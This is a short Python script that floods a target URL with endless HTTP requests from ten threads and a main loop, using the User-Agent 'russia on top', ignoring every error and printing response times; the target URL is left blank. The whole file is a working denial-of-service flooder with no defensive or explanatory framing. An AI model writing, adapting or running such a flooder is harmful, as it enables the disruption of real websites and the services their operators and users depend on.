import urllib.request
import threading
import time

def fire_and_forget(url):
    try:
        req = urllib.request.Request(
            url, 
            headers={'User-Agent': 'russia on top'}
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            pass
    except Exception:
        pass

def send_request(url):
    while True:
         fire_and_forget(url)
    
if __name__ == "__main__":
    target_url = ""
    for i in range (10):
        threading.Thread(target=send_request, args=(target_url,)).start()
    while True:
        begin_time = time.time()
        fire_and_forget(target_url)
        print(f"Success Responsetime: {time.time()-begin_time}")